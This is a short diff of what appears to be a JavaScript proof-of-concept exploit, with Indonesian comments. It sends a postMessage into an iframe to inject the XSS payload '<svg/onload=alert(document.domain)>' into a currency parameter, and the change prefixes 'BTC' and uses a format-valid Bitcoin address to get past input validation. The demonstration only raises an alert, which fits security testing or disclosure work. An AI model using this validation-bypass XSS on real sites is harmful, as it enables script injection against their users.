@@ -13,7 +13,7 @@
             console.log("Iframe loaded. Sending malicious postMessage...");
 
             // Payload XSS yang akan kita suntikkan ke parameter currency
-            const xss_payload = "<svg/onload=alert(document.domain)>";
+            const xss_payload = "BTC<svg/onload=alert(document.domain)>";
 
             // Gunakan alamat dengan format yang valid untuk lolos dari validasi awal
             // Ini adalah alamat donasi Bitcoin yang valid secara format.
